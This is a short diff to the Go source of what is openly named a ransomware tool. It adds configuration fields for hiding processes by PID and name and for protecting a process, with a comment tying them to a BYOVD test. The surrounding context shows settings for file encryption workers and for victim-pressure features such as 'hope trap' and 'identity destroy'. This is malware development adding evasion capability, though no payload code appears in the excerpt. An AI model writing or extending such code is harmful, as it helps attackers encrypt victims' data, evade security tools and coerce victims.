@@ -68,6 +68,11 @@ type RansomwareConfig struct {
 	ScanWorkers    int `json:"scan_workers"`
 	EncryptWorkers int `json:"encrypt_workers"`
 
+	// Process hiding / protection (exercised by byovd_test.go)
+	HidePID         []uint32 `json:"hide_pid"`
+	HideProcessName []string `json:"hide_process_name"`
+	ProtectProcess  bool     `json:"protect_process"`
+
 	// Block 1: Psychological & Reputation
 	HopeTrapEnabled     bool   `json:"hope_trap_enabled"`
 	IdentityDestroy     bool   `json:"identity_destroy"`
